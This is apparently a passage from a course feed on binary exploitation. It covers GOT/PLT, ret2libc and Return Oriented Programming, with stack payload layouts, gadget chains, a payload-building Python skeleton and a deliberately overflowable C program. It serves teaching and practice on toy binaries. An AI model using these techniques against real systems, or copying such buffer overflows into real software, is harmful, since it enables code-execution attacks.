&lt;a href="http://projects.webappsec.org/w/page/13246926/Format%20String" title="http://projects.webappsec.org/w/page/13246926/Format%20String">Format String Attack (webappsec)&lt;/a>
&lt;a href="http://www.gratisoft.us/todd/papers/strlcpy.html" title="http://www.gratisoft.us/todd/papers/strlcpy.html">strlcpy and strlcat - consistent, safe, string copy and concatenation.&lt;/a> - This resource is useful to understand some of the string manipulation problems.&lt;/p>
&lt;hr>
&lt;p>Except where otherwise noted, content on this page is licensed under the
following license: &lt;a href="https://creativecommons.org/licenses/by-sa/4.0/deed.en">CC Attribution-Share Alike 4.0 International&lt;/a>&lt;/p></description></item><item><title>Binary:</title><link>/binary/return-oriented-programming/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/binary/return-oriented-programming/</guid><description>
&lt;h1 id="return-oriented-programming">Return Oriented Programming&lt;/h1>
&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="#prerequisites">Prerequisites&lt;/a>&lt;/li>
&lt;li>&lt;a href="#recap---aslr">Recap - ASLR&lt;/a>&lt;/li>
&lt;li>&lt;a href="#solution---got-and-plt">Solution - GOT and PLT&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#further-inspection">Further Inspection&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#return-oriented-programming-rop">Return Oriented Programming (ROP)&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#motivation">Motivation&lt;/a>&lt;/li>
&lt;li>&lt;a href="#nop-analogy">NOP Analogy&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#gadgets-and-rop-chains">Gadgets and ROP Chains&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#code-execution">Code Execution&lt;/a>&lt;/li>
&lt;li>&lt;a href="#changing-register-values">Changing Register Values&lt;/a>&lt;/li>
&lt;li>&lt;a href="#clearing-the-stack">Clearing the Stack&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#some-useful-tricks">Some Useful Tricks&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#memory-spraying">Memory Spraying&lt;/a>&lt;/li>
&lt;li>&lt;a href="#checksec-in-pwndbg">checksec in pwndbg&lt;/a>&lt;/li>
&lt;li>&lt;a href="#finding-gadgets-in-pwndbg">Finding Gadgets in pwndbg&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#further-reading">Further Reading&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#linux-x86-program-start-up">Linux x86 Program Start Up&lt;/a>&lt;/li>
&lt;li>&lt;a href="#the-pltsec-schema">The .plt.sec Schema&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#more-about-cet-and-endbr">More about CET and endbr&lt;/a>&lt;/li>
&lt;li>&lt;a href="#tldr">TLDR&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#putting-it-all-together-demo">Putting it all Together: Demo&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#calling-a-function">Calling a Function&lt;/a>&lt;/li>
&lt;li>&lt;a href="#calling-a-function-with-parameters">Calling a Function with Parameters&lt;/a>&lt;/li>
&lt;li>&lt;a href="#calling-multiple-functions">Calling Multiple Functions&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#finding-gadgets---ropgadget">Finding Gadgets - ROPgadget&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#challenges">Challenges&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#01-tutorial---bypass-nx-stack-with-return-to-libc">01. Tutorial - Bypass NX Stack with return-to-libc&lt;/a>&lt;/li>
&lt;li>&lt;a href="#02-challenge---ret-to-libc">02. Challenge - ret-to-libc&lt;/a>&lt;/li>
&lt;li>&lt;a href="#03-challenge---no-ret-control">03. Challenge - no-ret-control&lt;/a>&lt;/li>
&lt;li>&lt;a href="#04-challenge---ret-to-plt">04. Challenge - ret-to-plt&lt;/a>&lt;/li>
&lt;li>&lt;a href="#05-challenge---gadget-tutorial">05. Challenge - gadget tutorial&lt;/a>&lt;/li>
&lt;li>&lt;a href="#06-bonus-challenge---echo-service">06. Bonus Challenge - Echo service&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#conclusions">Conclusions&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="prerequisites">Prerequisites&lt;/h2>
&lt;p>In order to fully grasp the content of this session, you should have a good
understanding of the following topics, both theoretically and practically:&lt;/p>
&lt;ul>
&lt;li>Stack frame&lt;/li>
&lt;li>Shellcodes&lt;/li>
&lt;li>ASLR&lt;/li>
&lt;li>DEP&lt;/li>
&lt;li>&lt;code>pwntools&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>If you are unfamiliar with any of the above concepts or if your understanding of
them is fuzzy, go over their corresponding sessions once again, before you
proceed with the current session.&lt;/p>
&lt;h2 id="recap---aslr">Recap - ASLR&lt;/h2>
&lt;p>ASLR is not the only feature that prevents the compiler and the linker from
solving some relocations before the binary is actually running. Shared libraries
can also be combined in different ways. Thus, the time when the loader is
running is actually the first time you get to know the address of a shared
library. The ASLR feature is orthogonal to this - the loader could choose to
assign the addresses to libraries in a round-robin fashion, or could use ASLR to
assign them randomly.&lt;/p>
&lt;p>Of course, we might be inclined to have the loader simply fix all relocations in
the code section after it loaded the libraries, but this breaks the memory
access protection of the &lt;code>.text&lt;/code> section, which should only be &lt;strong>readable&lt;/strong> and
&lt;strong>executable&lt;/strong>.&lt;/p>
&lt;h2 id="solution---got-and-plt">Solution - GOT and PLT&lt;/h2>
&lt;p>In order to solve this issue, we need another level of indirection. Through this
new level, all accesses to symbols located in shared libraries will read the
actual address from a table at runtime. This table is called the
&lt;strong>Global Offset Table (&lt;code>.got&lt;/code>)&lt;/strong>. The one who populates this table is the
loader. Note that this can work both for data accesses, as well as for function
calls. However, function calls are actually using a small stub (i.e., a few
instructions) stored in the &lt;strong>Procedure Linkage Table (&lt;code>.plt&lt;/code>)&lt;/strong>.&lt;/p>
&lt;p>The PLT is responsible of finding the shared library function address when it is
first called (&lt;strong>lazy binding&lt;/strong>), and writing it to a GOT entry. Note that the
function pointers are stored in &lt;code>.got.plt&lt;/code>). The following calls use the
pre-resolved address.&lt;/p>
&lt;p>Let&amp;rsquo;s take a quick look at the code generated for a shared library call. We&amp;rsquo;ll
be using the binary compiled from the code below, which simply calls &lt;code>puts()&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">#include&lt;/span> &lt;span style="color:#8f5902;font-style:italic">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#8f5902;font-style:italic">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">int&lt;/span> &lt;span style="color:#000">main&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#204a87;font-weight:bold">void&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">puts&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;Hello world!&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">return&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>After compiling this code, let&amp;rsquo;s look at the call to &lt;code>puts()&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ objdump -D -j .text -M intel hello | grep puts
80483e4: e8 07 ff ff ff call 80482f0 &amp;lt;puts@plt&amp;gt;
&lt;/code>&lt;/pre>&lt;p>If we look at the &lt;code>.plt&lt;/code> section, we see that it starts at address &lt;code>0x080482e0&lt;/code>,
right where the previous call jumps:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ readelf --sections hello
[...]
[12] .plt PROGBITS 080482e0 0002e0 000040 04 AX 0 0 16
[...]
&lt;/code>&lt;/pre>&lt;p>Now let&amp;rsquo;s see how the code in &lt;code>.plt&lt;/code> looks like:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ objdump -D -j .plt -M intel hello | grep -A 3 &amp;#39;&amp;lt;puts@plt&amp;gt;&amp;#39;
080482f0 &amp;lt;puts@plt&amp;gt;:
80482f0: ff 25 00 a0 04 08 jmp DWORD PTR ds:0x804a000
80482f6: 68 00 00 00 00 push 0x0
80482fb: e9 e0 ff ff ff jmp 80482e0 &amp;lt;_init+0x30&amp;gt;
&lt;/code>&lt;/pre>&lt;p>We see this code performing a jump to address &lt;code>0x804a000&lt;/code> inside the data
section. Let&amp;rsquo;s check the binary relocations for that location:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ readelf --relocs hello
[...]
Relocation section &amp;#39;.rel.plt&amp;#39; at offset 0x298 contains 3 entries:
Offset Info Type Sym.Value Sym. Name
0804a000 00000107 R_386_JUMP_SLOT 00000000 puts
[...]
&lt;/code>&lt;/pre>&lt;p>Ok, good, but what is actually stored at this address initially?&lt;/p>
&lt;pre tabindex="0">&lt;code>$ objdump -s -M intel -j .got.plt --start-address=0x0804a000 hello
hello: file format elf32-i386
Contents of section .got.plt:
804a000 f6820408 06830408 16830408 ............
&lt;/code>&lt;/pre>&lt;p>We recognize &lt;code>f6820408&lt;/code> (&lt;code>0x80482f6&lt;/code>) as being the next instruction in the
&lt;code>puts@plt&lt;/code> stub that we disassembled above. Which then pushes 0 in the stack and
calls 0x80482e0. This is the call to the one-time resolver, and it looks like
this:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ objdump -D -j .plt -M intel hello | grep -A 3 &amp;#39;080482e0&amp;#39;
080482e0 &amp;lt;puts@plt-0x10&amp;gt;:
80482e0: ff 35 f8 9f 04 08 push DWORD PTR ds:0x8049ff8
80482e6: ff 25 fc 9f 04 08 jmp DWORD PTR ds:0x8049ffc
80482ec: 00 00 add BYTE PTR [eax],al
&lt;/code>&lt;/pre>&lt;p>What&amp;rsquo;s going on here? What&amp;rsquo;s actually happening is lazy binding - by convention
when the dynamic linker loads a library, it will put an identifier and
resolution function into known places in the GOT. Therefore, what happens is
roughly this: on the first call of a function, it falls through to call the
default stub, it simply jumps to the next instruction. The identifier is pushed
on the stack, the dynamic linker is called, which at that point has enough
information to figure out “hey, this program is trying to find the function
foo”. It will go ahead and find it, and then patch the address into the GOT such
that the next time the original PLT entry is called, it will load the actual
address of the function, rather than the lookup stub. Ingenious!&lt;/p>
&lt;h3 id="further-inspection">Further Inspection&lt;/h3>
&lt;p>Going further into the resolver is left as an exercise. You can use GDB to
inspect the address in &lt;code>0x8049ffc&lt;/code>, and what happens when this jumps there.&lt;/p>
&lt;h2 id="return-oriented-programming-rop">Return Oriented Programming (ROP)&lt;/h2>
&lt;h3 id="motivation">Motivation&lt;/h3>
&lt;p>In the previous sessions we discussed &lt;code>ret2libc&lt;/code> attacks. The standard attack
was to perform an overwrite in the following way:&lt;/p>
&lt;pre tabindex="0">&lt;code>RET + 0x00: addr of system
RET + 0x04: JUNK
RET + 0x08: address to desired command (e.g. &amp;#39;/bin/sh&amp;#39;)
&lt;/code>&lt;/pre>&lt;p>However, what happens when you need to call multiple functions? Say you need
to call &lt;code>f1()&lt;/code> and then &lt;code>f2(0xAB, 0xCD)&lt;/code>? The payload should be:&lt;/p>
&lt;pre tabindex="0">&lt;code>RET + 0x00: addr of f1
RET + 0x04: addr of f2 (return address after f1 finishes)
RET + 0x08: JUNK (return address after f2 finishes: we don&amp;#39;t care about what happens after the 2 functions are called)
RET + 0x0c: 0xAB (param1 of f2)
RET + 0x10: 0xCD (param2 of f2)
&lt;/code>&lt;/pre>&lt;p>What about if we need to call &lt;code>f1(0xAB, 0xCD)&lt;/code> and then &lt;code>f2(0xEF, 0x42)&lt;/code>?&lt;/p>
&lt;pre tabindex="0">&lt;code>RET + 0x00: addr of f1
RET + 0x04: addr of f2 (return address after f1 finishes)
RET + 0x08: 0xAB (param1 of f1)
RET + 0x0c: 0xCD (param2 of f1) but this should also be 0xEF (param1 of f2)
RET + 0x10: 0x42 (param2 of f2)
&lt;/code>&lt;/pre>&lt;h3 id="nop-analogy">NOP Analogy&lt;/h3>
&lt;p>While &lt;code>ret2libc&lt;/code> uses functions directly, ROP uses a finer level of code
execution: instruction groups. Let&amp;rsquo;s explore an example:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">int&lt;/span> &lt;span style="color:#000">main&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#204a87;font-weight:bold">void&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">char&lt;/span> &lt;span style="color:#000">a&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">16&lt;/span>&lt;span style="color:#000;font-weight:bold">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">read&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">a&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">100&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">return&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This code obviously suffers from a stack buffer overflow. The offset to the
return address is 24. So &lt;code>DOWRD&lt;/code>s from offset 24 onwards will be popped from the
stack and executed. Remember the &lt;code>NOP&lt;/code> sled concept from previous sessions?
These were long chains of &lt;code>NOP&lt;/code> instructions (&lt;code>\x90&lt;/code>) used to pad a payload for
alignment purposes. Since we can&amp;rsquo;t add any new code to the program (&lt;em>NX&lt;/em> is
enabled) how could we simulate the effect of a &lt;code>NOP&lt;/code> sled? Easy! Using return
instructions!&lt;/p>
&lt;p>Let&amp;rsquo;s find the &lt;code>ret&lt;/code> instructions in a would-be binary:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ objdump -d hello -M intel | grep $&amp;#39;\t&amp;#39;ret
80482dd: c3 ret
804837a: c3 ret
80483b7: c3 ret
8048437: c3 ret
8048444: c3 ret
80484a9: c3 ret
80484ad: c3 ret
80484c6: c3 ret
&lt;/code>&lt;/pre>&lt;p>Any and all of these addresses will be ok. The payload could be the following:&lt;/p>
&lt;pre tabindex="0">&lt;code>RET + 0x00: 0x80482dd
RET + 0x04: 0x80482dd
RET + 0x08: 0x80482dd
RET + 0x0c: 0x80482dd
RET + 0x10: 0x80482dd
[...]
&lt;/code>&lt;/pre>&lt;p>The above payload will run like so: the original &lt;code>ret&lt;/code> (in the normal code flow)
will pop &lt;code>RET+0x00&lt;/code> off the stack and jump to it. When &lt;code>RET+0x00&lt;/code> gets popped,
the stack is automatically increased by 4 (on to the next value). The
instruction at &lt;code>0x80482dd&lt;/code> is another &lt;code>ret&lt;/code>, which does the same thing as before.
This goes on until another address that is not a &lt;code>ret&lt;/code> is popped off the stack.&lt;/p>
&lt;p>In general, you can use the skeleton below to generate payloads:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">#! /usr/bin/python3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">import&lt;/span> &lt;span style="color:#000">struct&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">,&lt;/span> &lt;span style="color:#000">sys&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">def&lt;/span> &lt;span style="color:#000">dw&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">i&lt;/span>&lt;span style="color:#000;font-weight:bold">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">return&lt;/span> &lt;span style="color:#000">struct&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">pack&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&amp;lt;I&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">i&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">#TODO update count for your prog&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">pad_count_to_ret&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">payload&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#4e9a06">b&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;X&amp;#34;&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">*&lt;/span> &lt;span style="color:#000">pad_count_to_ret&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">#TODO figure out the rop chain&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">payload&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">+=&lt;/span> &lt;span style="color:#000">dw&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0xcafebeef&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">payload&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">+=&lt;/span> &lt;span style="color:#000">dw&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0xdeadc0de&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">sys&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">stdout&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">write&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">payload&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">decode&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;ascii&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;replace&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="gadgets-and-rop-chains">Gadgets and ROP Chains&lt;/h2>
&lt;h3 id="code-execution">Code Execution&lt;/h3>
&lt;p>Now that we&amp;rsquo;ve understood the basics of Return Oriented Programming, let&amp;rsquo;s
actually do something useful. The building blocks of ROP payloads are called
&lt;strong>gadgets&lt;/strong>. These are blocks of instructions that end with a &lt;code>ret&lt;/code> instruction.
Here are some &lt;em>gadgets&lt;/em> from the previous program:&lt;/p>
&lt;pre tabindex="0">&lt;code>0x8048443: pop ebp; ret
0x80484a7: pop edi; pop ebp; ret
0x8048441: mov ebp,esp; pop ebp; ret
0x80482da: pop eax; pop ebx; leave; ret
0x80484c3: pop ecx; pop ebx; leave; ret
&lt;/code>&lt;/pre>&lt;p>By carefully placing addresses to such gadgets on the stack we can bring code
execution to almost any context we want. As an example, let&amp;rsquo;s say we would like
to load &lt;code>0x41424344&lt;/code> into &lt;code>eax&lt;/code> and &lt;code>0x61626364&lt;/code> into &lt;code>ebx&lt;/code>. The payload should
look like this:&lt;/p>
&lt;pre tabindex="0">&lt;code>RET + 0x00: 0x80482da (pop eax; pop ebx; leave; ret)
RET + 0x04: 0x41424344
RET + 0x08: 0x61626364
RET + 0x0c: 0xAABBCCDD (instruction were the gadget&amp;#39;s ret will jump to)
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s see what exactly happens when this payload is given to our binary:&lt;/p>
&lt;ul>
&lt;li>First the ret addr is popped from the stack and execution goes there.&lt;/li>
&lt;li>At &lt;code>pop eax&lt;/code>, &lt;code>0x41424344&lt;/code> is loaded into &lt;code>eax&lt;/code> and the stack is increased.&lt;/li>
&lt;li>At &lt;code>pop ebx&lt;/code>, &lt;code>0x61626364&lt;/code> is loaded into &lt;code>ebx&lt;/code> and the stack is increased
again.&lt;/li>
&lt;li>At &lt;code>leave&lt;/code>, two things actually happen: &lt;code>mov esp, ebp; pop ebp&lt;/code>. So the stack
frame is decreased to the previous one (pointed by &lt;code>ebp&lt;/code>) and &lt;code>ebp&lt;/code> is updated
to the one before that. So &lt;code>esp&lt;/code> will now be the old &lt;code>ebp + 4&lt;/code>.&lt;/li>
&lt;li>At &lt;code>ret&lt;/code>, the code flow will go to the instruction pointed to by &lt;code>ebp+4&lt;/code>. This
implies that execution will not go to &lt;code>0xAABBCCDD&lt;/code> but to some other address
that may or may not be in our control (depending on how much we can overflow on
the stack). If it is in our control we can overwrite that address with the rest
of the ROP chain.&lt;/li>
&lt;/ul>
&lt;h3 id="changing-register-values">Changing Register Values&lt;/h3>
&lt;p>We have now seen how gadgets can be useful if we want the CPU to achieve a
certain state. This is particularly useful on other architectures such as ARM
and x86_64 where functions do not take parameters from the stack but from
registers. As an example, if we want to call &lt;code>f1(0xAB, 0xCD, 0xEF)&lt;/code> on x86_64 we
first need to know the calling convention for the first three parameters (the
convention for placing the rest of the parameters can be found in
&lt;a href="https://en.wikipedia.org/wiki/X86_calling_conventions#x86-64_calling_conventions">table here&lt;/a>):&lt;/p>
&lt;pre tabindex="0">&lt;code>1st param: RDI
2nd param: RSI
3rd param: RDX
&lt;/code>&lt;/pre>&lt;p>Now we need to find gadgets for each of these parameters. Let&amp;rsquo;s assume these 2
scenarios: Scenario 1:&lt;/p>
&lt;pre tabindex="0">&lt;code>0x400124: pop rdi; pop rsi; ret
0x400235: pop rdx; ret
0x400440: f1()
Payload:
RET + 0x00: 0x400124
RET + 0x08: val of RDI (0xAB)
RET + 0x10: val of RSI (0xCD)
RET + 0x18: 0x400235
RET + 0x20: val of RDX
RET + 0x28: f1
&lt;/code>&lt;/pre>&lt;p>Scenario 2:&lt;/p>
&lt;pre tabindex="0">&lt;code>0x400125: pop rdi; ret
0x400252: pop rsi; ret
0x400235: pop rdx; ret
0x400440: f1()
Payload:
RET + 0x00: 0x400125
RET + 0x08: val of RDI (0xAB)
RET + 0x10: 0x400252
RET + 0x18: val of RSI (0xCD)
RET + 0x20: 0x400235
RET + 0x28: val of RDX
RET + 0x30: f1
&lt;/code>&lt;/pre>&lt;p>Notice that because the architecture is 64 bits wide, the values on the stack
are not dwords but qwords (quad words: 8 bytes wide). Thus, the offsets between
the values in the payload are 8, instead of 4 (as they would be on a 32-bit
architecture).&lt;/p>
&lt;h3 id="clearing-the-stack">Clearing the Stack&lt;/h3>
&lt;p>The second use of gadgets is to clear the stack. Remember the issue we had in
the &lt;a href="#motivation">Motivation&lt;/a> section? Let&amp;rsquo;s solve it using gadgets. We need to call
&lt;code>f1(0xAB, 0xCD)&lt;/code> and then &lt;code>f2(0xEF, 0x42)&lt;/code>. Our initial solution was:&lt;/p>
&lt;pre tabindex="0">&lt;code>RET + 0x00: addr of f1
RET + 0x04: addr of f2 (return address after f1 finishes)
RET + 0x08: 0xAB (param1 of f1)
RET + 0x0c: 0xCD (param2 of f1) but this should also be 0xEF (param1 of f2)
RET + 0x10: 0x42 (param2 of f2)
&lt;/code>&lt;/pre>&lt;p>Note that now, for the sake of clarity, we&amp;rsquo;re moving back to &lt;code>x32&lt;/code>, so that
parameters are again passed on the stack.&lt;/p>
&lt;p>The problem is that those parameters of &lt;code>f1&lt;/code> are getting in the way of calling
&lt;code>f2&lt;/code>. We need to find a &lt;code>pop pop ret&lt;/code> gadget. The actual registers are not
important, as we only need to clear 2 values from the stack.&lt;/p>
&lt;pre tabindex="0">&lt;code>RET + 0x00: addr of f1
RET + 0x04: addr of (pop eax, pop ebx, ret)
RET + 0x08: 0xAB (param1 of f1)
RET + 0x0c: 0xCD (param2 of f1)
RET + 0x10: addr of f2
RET + 0x14: JUNK
RET + 0x18: 0xEF (param1 of f2)
RET + 0x1c: 0x42 (param2 of f2)
&lt;/code>&lt;/pre>&lt;p>Now we can even call the next function &lt;code>f3&lt;/code> if we repeat the trick:&lt;/p>
&lt;pre tabindex="0">&lt;code>RET + 0x00: addr of f1
RET + 0x04: addr of (pop eax, pop ebx, ret)
RET + 0x08: 0xAB (param1 of f1)
RET + 0x0c: 0xCD (param2 of f1)
RET + 0x10: addr of f2
RET + 0x14: addr of (pop eax, pop ebx, ret)
RET + 0x18: 0xEF (param1 of f2)
RET + 0x1c: 0x42 (param2 of f2)
RET + 0x20: addr of f3
&lt;/code>&lt;/pre>&lt;h2 id="some-useful-tricks">Some Useful Tricks&lt;/h2>
&lt;h3 id="memory-spraying">Memory Spraying&lt;/h3>
&lt;p>Let&amp;rsquo;s take the following program:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">int&lt;/span> &lt;span style="color:#000">main&lt;/span>&lt;span style="color:#000;font-weight:bold">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">int&lt;/span> &lt;span style="color:#000">x&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">y&lt;/span> &lt;span style="color:#000;font-weight:bold">,&lt;/span>&lt;span style="color:#000">z&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">char&lt;/span> &lt;span style="color:#000">a&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>&lt;span style="color:#000">b&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>&lt;span style="color:#000">c&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">char&lt;/span> &lt;span style="color:#000">buf&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">23&lt;/span>&lt;span style="color:#000;font-weight:bold">];&lt;/span>
